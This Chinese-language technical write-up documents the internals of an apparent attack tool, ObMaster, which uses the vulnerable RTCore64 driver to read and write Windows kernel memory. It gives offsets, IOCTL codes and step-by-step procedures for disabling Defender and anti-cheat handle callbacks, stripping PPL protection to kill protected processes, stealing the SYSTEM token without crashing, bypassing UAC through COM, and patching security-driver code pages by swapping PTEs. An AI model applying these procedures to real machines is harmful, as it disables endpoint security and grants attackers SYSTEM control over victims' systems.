# Windows Kernel Internals — ObMaster 技术背景

> 本文解释 ObMaster 依赖的三个核心 Windows 内核概念：ObRegisterCallbacks、EPROCESS、PPL bypass。

---

## 1. ObRegisterCallbacks

Windows 内核提供的一个 API，让驱动程序**监听进程/线程对象的句柄操作**。

```
任何程序调用 OpenProcess(pid) 时：
  ↓
内核创建句柄前，先遍历 _OBJECT_TYPE.CallbackList
  ↓
每个注册了的驱动回调都会被调用
  ↓
回调可以：降低访问权限、直接拒绝、记录日志
```

### 谁在用

| 驱动 | 用途 |
|---|---|
| `WdFilter.sys` | Windows Defender — 监控进程访问行为 |
| `vgk.sys` | Valorant 反作弊 — 阻止调试器/外挂打开游戏进程 |
| `ksafecenter64.sys` | 360 安全卫士 — 保护自身进程不被终止 |

这就是为什么 `OpenProcess(PROCESS_ALL_ACCESS, target)` 有时会被悄悄降权成只读——不是系统拒绝，是驱动在中间截了一刀。

### 内核结构

回调注册信息存储在 `_OBJECT_TYPE` 结构的 `CallbackList` 链表里：

```
_OBJECT_TYPE + 0x0C8  →  CallbackList (LIST_ENTRY, 链表头)
                              ↓
                         OB_CALLBACK_ENTRY
                           +0x010  Operations  (1=CREATE, 2=DUPLICATE)
                           +0x014  Enabled     (1 byte)
                           +0x028  PreOperation  (函数指针)
                           +0x030  PostOperation (函数指针)
```

`PsProcessType` 和 `PsThreadType` 是两个内核导出变量，分别指向进程和线程的 `_OBJECT_TYPE`。

### ObMaster 如何处理

```
/obcb  → 读 PsProcessType/PsThreadType → 遍历 CallbackList → 打印每个回调的驱动归属
/disable <addr> → 将 Enabled 写 0，PreOperation/PostOperation 写 0
/enable  <addr> → 将 Enabled 写 1
```

---

## 2. EPROCESS

每个进程在内核里都有一个 `_EPROCESS` 结构体，是进程的**内核身份证**。

```
用户态                         内核态
──────────────────────────────────────────────────
PID 780 (smss.exe)  →   _EPROCESS @ 0xffffc20aa523b040
                          ├── +0x440  UniqueProcessId           = 0x30c (780)
                          ├── +0x448  ActiveProcessLinks        → 下一个进程的链表节点
                          ├── +0x540  InheritedFromUniqueProcessId = 4 (PPID)
                          ├── +0x550  Peb                       → 用户态 PEB
                          ├── +0x570  HandleTable               → 句柄表
                          ├── +0x5a8  ImageFileName             = "smss.exe"
                          ├── +0x5f0  ActiveThreads             = 2
                          ├── +0x7d8  VadRoot                   → 虚拟地址描述符树
                          └── +0x87a  Protection                = 0x61 (PPL/WinTcb)
```

> 以上偏移量适用于 Windows 10 22H2 x64 (build 19045)。不同版本可能不同，用 `/epdump <pid>` 验证。

### ActiveProcessLinks 链表

所有进程的 `_EPROCESS` 通过 `ActiveProcessLinks`（`LIST_ENTRY`，双向链表）串联：

```
PsInitialSystemProcess
       ↓
  [System, pid=4]  ←→  [Registry, pid=148]  ←→  [smss.exe, pid=780]  ←→  ...
```

链表头 `PsInitialSystemProcess` 是内核导出符号，可通过 `GetProcAddress(ntoskrnl)` 计算其内核虚拟地址。

### ObMaster 如何处理

`/proc` 的完整流程：

```
1. KernelExport("PsInitialSystemProcess")
   → LoadLibrary(ntoskrnl.exe) 计算 RVA，加上内核基址得到内核 VA

2. Rd64(PsInitialSystemProcess_addr)
   → 读出 System 进程的 EPROCESS 地址

3. 从 EPROCESS+0x440 读 PID
   从 EPROCESS+0x5a8 读 ImageFileName
   从 EPROCESS+0x87a 读 Protection
   从 EPROCESS+0x540 读 PPID
   ...

4. 读 EPROCESS+0x448 (ActiveProcessLinks.Flink)
   减去 0x448 得到下一个 EPROCESS 基址

5. 重复直到回到 System 进程（链表为环形）
```

全程**不调用 `OpenProcess` 或 `NtQuerySystemInformation`**，ObRegisterCallbacks 永远不会被触发。这是避免查询 System (pid=4) 时死锁的关键。

---

## 3. PPL Bypass

### 什么是 PPL

PPL (Protected Process Light) 是 Windows 的进程保护机制，保护级别存储在 `EPROCESS+0x87a` 这**一个字节**里：

```c
// _PS_PROTECTION (1 byte)
// 低 3 位 = Type,  高 4 位 = Signer
//
// Type:   0=None  1=PPL  2=PP
// Signer: 0=None  1=Authenticode  2=CodeGen  3=Antimalware
//         4=Lsa   5=Windows       6=WinTcb   7=WinSystem

0x00 = 无保护          (普通进程)
0x61 = PPL / WinTcb   (smss.exe, csrss.exe, services.exe)
0x62 = PP  / WinTcb   (wininit.exe)
0x72 = PP  / WinSystem (System 进程本身)
```

内核在 `OpenProcess` 时检查这个字节：如果目标保护级别比调用方高，直接返回 `ACCESS_DENIED`。

### 绕过原理

**保护机制本身存在可写的内核内存里**，RTCore64 提供任意内核内存写入能力：

```
1. FindEPROCESS(pid)
   → 遍历 ActiveProcessLinks 找到目标进程的 EPROCESS 地址

2. origProt = Rd8(eprocess + 0x87a)
   → 读取并保存原始保护字节

3. Wr8(eprocess + 0x87a, 0x00)
   → 将保护级别写为 0（无保护）
   → 内核此后认为这是一个普通进程

4. OpenProcess(PROCESS_TERMINATE, pid)  → 成功
   TerminateProcess(hProc, 1)           → 进程终止

5. 如果 TerminateProcess 仍然失败：
   Wr8(eprocess + 0x87a, origProt)      → 恢复原值，避免系统不稳定
```

### 为什么有效

PPL 的威胁模型假设**内核内存是不可篡改的**。RTCore64 (CVE-2019-16098) 破坏了这个假设——它是一个合法签名的驱动，但暴露了无访问控制的内核 R/W IOCTL，使得任何管理员进程都能直接读写内核内存。

保护机制只是一个字节，写 `0x00` 就关掉了。

### Token Steal（elevate-pid / elevate-self Stage 2）

另一种提权路径：不修改 PPL 保护字节，而是直接**把 winlogon 的 SYSTEM token 写入目标进程的 `EPROCESS.Token`**。

```
1. FindEPROCESS(winlogon)  → winlogonEP
2. FindEPROCESS(targetPid) → targetEP
3. winlogonToken = Rd64(winlogonEP + 0x4b8)   // EX_FAST_REF 原值
4. tokenPtr = winlogonToken & ~0xFULL          // 去掉低 4 位缓存计数
5. PointerCount = Rd64(tokenPtr - 0x30)        // OBJECT_HEADER.PointerCount
6. Wr64(tokenPtr - 0x30, PointerCount + 1)     // 增加引用计数！
7. Wr64(targetEP + 0x4b8, tokenPtr)            // 写干净指针（低位=0）
```

**为什么必须 +1 PointerCount**：

`EPROCESS.Token` 是 `EX_FAST_REF` 结构，低 4 位是内联缓存引用计数（不是 Object 引用计数本体）。如果直接复制 winlogon 的原值（如 `0xFFFFC50C9835806F`，低位 `F`=15 个缓存引用），这 15 个缓存引用并没有被记录到 `OBJECT_HEADER.PointerCount` 里。后续 `NtQueryInformationToken` 等系统调用会调用 `ObfDereferenceObjectWithTag` 减引用，导致计数跌成 -1，触发 Bugcheck 0x18（REFERENCE_BY_POINTER）。

正确做法：
- 写入前在 `tokenPtr - 0x30`（`OBJECT_HEADER.PointerCount`）+1，表明新增了一个引用
- 写入时用干净指针（低 4 位 = 0），不携带未记录的缓存引用

`OBJECT_HEADER.Body` 在 `+0x30`，所以 `tokenPtr - 0x30` = OBJECT_HEADER 基址 = PointerCount 所在处。

**两阶段 elevate-self 流程**：

```
Stage 1: ICMLuaUtil COM UAC bypass（不需要驱动）
  → CoGetObject elevation moniker → ShellExec "sc start RTCore64 [& extra]"
  → 成功 → 退出

Stage 2: 内核 token 窃取（需要 RTCore64 已加载）
  → Token steal (含 PointerCount +1) → 当前进程变 SYSTEM
  → CreateProcess 以 SYSTEM 身份执行 extraCmd
```

COM 路径可被 AV/EDR 拦截（hook ole32、consent.exe 等），但 `Wr64(EPROCESS+0x4b8)` 完全在内核内存层操作，任何用户态拦截无效。

---

## 4. 页表与 Safepatch

### 4KB 页 vs 2MB 大页

x86-64 有两种页大小：

| | 4KB 普通页 | 2MB 大页（Large Page）|
|---|---|---|
| 映射单位 | 4KB | 2MB |
| 页表项 | PTE（Page Table Entry）| PDE 带 PS=1 标志，无 PTE |
| CPU 查表路径 | PML4E → PDPTE → PDE → **PTE** → 物理地址 | PML4E → PDPTE → **PDE(PS=1)** → 物理地址（跳过 PTE 层）|
| Windows 内核使用 | 用户态页、部分内核数据 | 内核驱动代码段、NonPagedPool |

Windows 内核加载器用大页装载驱动代码段（性能优化），所以 mfehidk.sys 等驱动的代码页通常是 2MB 大页。

### MmPteBase 与 PTE 自映射

Windows 用**自映射**机制让内核可以通过虚拟地址访问任意 PTE：

```
PteVaOf(va) = MmPteBase + ((va & 0x0000FFFFFFFFF000) >> 9)
```

`MmPteBase` 是 512GB 对齐的内核变量，KASLR 每次开机随机化。ObMaster 通过扫描 ntoskrnl 中 `MiGetPteAddress` 函数的 MOV 指令（`8B` opcode）找到它。

对 2MB 大页地址调用 PteVaOf 会得到一个落在大页内部的地址——CPU 根本不用这个地址作为 PTE，写它毫无效果。

### Safepatch 原理

对 4KB 代码页的只读保护绕过：

```
1. ReadPte(addr)          → 读目标页的 PTE，获取原始物理地址（PA）
2. VirtualAlloc shadow    → 分配用户态 shadow 页，VirtualLock 锁住不换出
3. ReadKernelPage         → 把原始内核页内容复制到 shadow 页（1024×Rd32）
4. 修改 shadow 页内容    → 打补丁
5. ReadPte(shadow_va)     → 获取 shadow 页 PA
6. WritePte(pageVA, newPte) → 把 PTE 的 PA 字段换成 shadow 页 PA
                             （两次 Wr32 而非 Wr64，因为 RTCore64 Size=8 IOCTL 静默无效）
7. FlushTlb(pageVA)       → MapPhys + Wr8 + UnmapPhys，广播 TLB 刷新
8. 验证 PTE readback      → 读回 PTE 确认 PA == shadow PA
9. restore（按需）        → WritePte 写回原始 PTE + FlushTlb
```

**大页限制**：对 2MB 大页地址，PteVaOf 返回大页内部地址（只读），WritePte 静默失败。需先检查 PDE 的 PS bit 判断是否大页。

### TLB（Translation Lookaside Buffer）

CPU 内部缓存虚拟→物理地址翻译结果。改了 PTE 后 TLB 可能还缓存旧映射，需要刷新。

**INVLPG 分析**：通过 kd.exe 全量反汇编 RTCore64.sys .text 段，逐 opcode 搜索——确认 RTCore64 **无 INVLPG（0F 01 /7）也无 WBINVD（0F 09）指令**，18 个 IOCTL 均不暴露此功能。

**FlushTlb 实现（当前方案）**：利用 RTCore64 已有的 MapPhys + WRITE + UnmapPhys 组合：

```
FlushTlb(va):
  1. ReadPte(va)          → 获取目标页 PA
  2. MapPhys(PA, 0x1000)  → IOCTL 0x80002050，内核调 MmMapIoSpace，分配全新 KVA，无 TLB 旧条目
  3. Wr8(mapped + offset) → IOCTL 0x8000204C，I/O 序列化，触发写屏障
  4. UnmapPhys(mapped)    → IOCTL 0x80002054，内核调 MmUnmapIoSpace，内部广播 TLB 刷新
```

`MmUnmapIoSpace` 在解除映射时会调用 `HalFlushIoBuffers` 并执行跨 CPU TLB 操作，无需手动 `~PTE_GLOBAL` 或依赖 context switch 时机。

旧方案（已废弃）：`newPte &= ~PTE_GLOBAL; WritePte(); SwitchToThread(); Sleep(5)` — 有时序依赖，会改动 PTE 标志位。

### RTCore64 IOCTL 完整表（kd.exe 反汇编实测）

RTCore64 共 18 个有效 IOCTL（0x80002000–0x80002054，步进 4），dispatch 通过归一化索引跳转：`index = (IoControlCode + 0x7FFFE000) & 0xFF`。

**I/O 端口操作（通过 HAL）**：

| IOCTL | 功能 |
|---|---|
| `0x80002000` | HalGetBusDataByOffset |
| `0x80002004` | HalTranslateBusAddress |
| `0x80002008` | HalSetBusDataByOffset |
| `0x8000200C` | IN byte（直接端口读）|
| `0x80002010` | IN word |
| `0x80002014` | IN dword |
| `0x80002018` | OUT byte（直接端口写）|
| `0x8000201C` | OUT word |
| `0x80002020` | OUT dword |
| `0x80002024–0x80002044` | 其余 HAL/端口变体（共 9 个）|

**内存操作**：

| IOCTL | 功能 | 备注 |
|---|---|---|
| `0x80002048` | 读内存，Size=1/2/4 | 正常 |
| `0x8000204C` | 写内存，Size=1/2/4 | 正常；**Size=8 静默无效，须用两次 Wr32** |
| `0x80002050` | MapPhys（MmMapIoSpace） | 正常；输入 PhysAddr+0, Size+0x10，输出 VirtAddr+0x20 |
| `0x80002054` | UnmapPhys（MmUnmapIoSpace） | 正常；输入 VirtAddr+0, Size+0x10 |

---

## 五者的关系

```
RTCore64.sys (BYOVD)
  │
  ├─ 读内核内存
  │     ├─ 遍历 EPROCESS 链      →  /proc
  │     ├─ 遍历 CallbackList     →  /obcb
  │     └─ 读 PTE 自映射区       →  ReadPte / IsVaMapped
  │
  └─ 写内核内存
        ├─ EPROCESS.Protection = 0          →  /kill PPL bypass
        ├─ OB_CALLBACK_ENTRY.Enabled = 0    →  /disable
        ├─ PTE PA 字段替换（两次 Wr32）      →  /safepatch（4KB 页）
        └─ FLT_OPERATION_REGISTRATION.PreOperation = 0  →  /wr64（NonPagedPool）
```

---

*偏移量来源：Windows 10 22H2 x64 build 19045，通过 `/epdump` 实测验证。*
*RTCore64 行为通过 kd.exe 反汇编 + Stage 0-3 实测确认（2026-04-08）。*
